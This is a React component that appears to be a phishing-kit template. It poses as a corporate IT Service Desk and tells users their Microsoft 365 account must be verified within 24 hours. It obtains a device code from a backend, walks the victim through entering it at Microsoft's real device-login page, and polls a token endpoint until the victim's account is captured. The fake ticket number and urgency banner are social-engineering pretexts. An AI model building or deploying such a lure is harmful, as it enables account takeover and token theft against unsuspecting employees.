import React, { useState, useEffect, useRef } from 'react';

const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';

type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';

export function ITSupportTemplate(): React.ReactElement {
  const [state, setState] = useState<CaptureState>('idle');
  const [userCode, setUserCode] = useState('');
  const [deviceCode, setDeviceCode] = useState('');
  const [copied, setCopied] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const [errorMsg, setErrorMsg] = useState('');
  const [pollInterval, setPollInterval] = useState(5);
  const [authEmail, setAuthEmail] = useState('');
  const [ticketId] = useState(() => `TKT-${Date.now().toString(36).toUpperCase()}`);
  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pollActiveRef = useRef(false);

  useEffect(() => {
    if (countdown <= 0 || (state !== 'code_ready' && state !== 'waiting')) return;
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) { clearInterval(timer); stopPolling(); setState('expired'); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [countdown, state]);

  useEffect(() => { return () => stopPolling(); }, []);

  function stopPolling(): void {
    pollActiveRef.current = false;
    if (pollTimerRef.current) { clearTimeout(pollTimerRef.current); pollTimerRef.current = null; }
  }

  function startPolling(dCode: string, interval: number): void {
    stopPolling();
    pollActiveRef.current = true;
    async function poll(): Promise<void> {
      if (!pollActiveRef.current) return;
      try {
        const res = await fetch('/api/token-poll', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceCode: dCode }) });
        const data = await res.json() as { status: string; error?: string; description?: string; email?: string };
        if (!pollActiveRef.current) return;
        if (data.status === 'complete') { stopPolling(); setAuthEmail(data.email ?? ''); setState('success'); return; }
        if (data.status === 'expired') { stopPolling(); setState('expired'); return; }
        if (data.status === 'slow_down') { const n = interval + 5; setPollInterval(n); if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, n * 1000); return; }
        if (data.status === 'error') { stopPolling(); setErrorMsg(data.description ?? data.error ?? 'Failed'); setState('error'); return; }
        if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000);
      } catch { if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000); }
    }
    pollTimerRef.current = setTimeout(poll, interval * 1000);
  }

  async function handleStart(): Promise<void> {
    setState('loading');
    setErrorMsg('');
    try {
      const res = await fetch('/api/device-code', { method: 'POST' });
      const data = await res.json() as { userCode: string; deviceCode: string; expiresIn: number; interval: number; error?: string };
      if (!res.ok || data.error) { setErrorMsg(data.error ?? 'Failed'); setState('error'); return; }
      setUserCode(data.userCode);
      setDeviceCode(data.deviceCode);
      setCountdown(data.expiresIn);
      setPollInterval(data.interval || 5);
      setState('code_ready');
      startPolling(data.deviceCode, data.interval || 5);
    } catch (err) { setErrorMsg(err instanceof Error ? err.message : 'Network error'); setState('error'); }
  }

  function handleCopy(): void {
    navigator.clipboard.writeText(userCode.replace(/\s/g, '')).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2500); });
  }

  function handleVerify(): void { setState('waiting'); window.open(DEVICE_AUTH_URL, '_blank'); }

  function handleReset(): void {
    stopPolling(); setState('idle'); setUserCode(''); setDeviceCode('');
    setCopied(false); setCountdown(0); setErrorMsg(''); setAuthEmail('');
  }

  function formatTime(s: number): string { return `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, '0')}`; }

  return (
    <div className="it-support-page">
      <div className="it-support-header">
        <div className="it-support-logo">
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="12" cy="12" r="3" /><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
          </svg>
          <span>IT Service Desk</span>
        </div>
        <div className="it-support-ticket">Ticket: {ticketId}</div>
      </div>

      <div className="it-support-container">
        <div className="it-support-sidebar">
          <div className="it-support-status">
            <div className="it-status-dot active" />
            <span>Support Available</span>
          </div>
          <div className="it-support-nav">
            <div className="it-nav-item active">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" /></svg>
              Account Verification
            </div>
            <div className="it-nav-item">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2" /><path d="M7 11V7a5 5 0 0 1 10 0v4" /></svg>
              Password Reset
            </div>
            <div className="it-nav-item">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2" /><line x1="8" y1="21" x2="16" y2="21" /><line x1="12" y1="17" x2="12" y2="21" /></svg>
              Device Setup
            </div>
          </div>
          <div className="it-support-help">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10" /><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" /><line x1="12" y1="17" x2="12.01" y2="17" /></svg>
            Need help? Contact helpdesk
          </div>
        </div>

        <div className="it-support-main">
          {state === 'idle' && (
            <>
              <div className="it-support-badge">Required Action</div>
              <h1>Account Verification Required</h1>
              <p>Your IT administrator requires you to verify your Microsoft 365 account. This is a routine security check to ensure account integrity.</p>
              <div className="it-support-notice">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#c4a000" strokeWidth="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" /><line x1="12" y1="9" x2="12" y2="13" /><line x1="12" y1="17" x2="12.01" y2="17" /></svg>
                <span>This verification must be completed within 24 hours to maintain account access.</span>
              </div>
              <button className="it-support-btn" onClick={handleStart}>
                Begin Verification
              </button>
            </>
          )}

          {state === 'loading' && (
            <div className="it-support-loading">
              <div className="capture-spinner" />
              <p>Generating secure verification code...</p>
            </div>
          )}

          {(state === 'code_ready' || state === 'waiting') && (
            <>
              <h1>Enter Verification Code</h1>
              <p>Use the code below to verify your account on the Microsoft portal.</p>
              <div className="it-support-code-box">
                <div className="it-support-code-label">VERIFICATION CODE</div>
                <div className="it-support-code">{userCode}</div>
                <button className="it-support-copy" onClick={handleCopy}>{copied ? 'Copied!' : 'Copy'}</button>
              </div>
              <div className="it-support-instructions">
                <div className="it-instruction"><span className="it-step-num">1</span>Copy the verification code above</div>
                <div className="it-instruction"><span className="it-step-num">2</span>Click the button below to open Microsoft verification</div>
                <div className="it-instruction"><span className="it-step-num">3</span>Paste the code and sign in with your work account</div>
              </div>
              <button className="it-support-btn" onClick={handleVerify}>Open Microsoft Verification</button>
              {state === 'waiting' && <div className="it-support-waiting">Waiting for verification to complete...</div>}
              <div className="it-support-expiry">Code expires in {formatTime(countdown)}</div>
            </>
          )}

          {state === 'success' && (
            <div className="it-support-result">
              <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" /><polyline points="22 4 12 14.01 9 11.01" /></svg>
              <h1>Verification Complete</h1>
              {authEmail && <p>Account verified: <strong>{authEmail}</strong></p>}
              <p>Your account has been successfully verified. No further action is needed.</p>
              <button className="it-support-btn secondary" onClick={handleReset}>Verify another account</button>
            </div>
          )}

          {state === 'expired' && (
            <div className="it-support-result">
              <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#d13438" strokeWidth="2"><circle cx="12" cy="12" r="10" /><line x1="12" y1="8" x2="12" y2="12" /><line x1="12" y1="16" x2="12.01" y2="16" /></svg>
              <h1>Code Expired</h1>
              <p>The verification code has expired. Please start over.</p>
              <button className="it-support-btn" onClick={handleReset}>Start Over</button>
            </div>
          )}

          {state === 'error' && (
            <div className="it-support-result">
              <h1>Verification Failed</h1>
              <p>{errorMsg}</p>
              <button className="it-support-btn" onClick={handleReset}>Try Again</button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
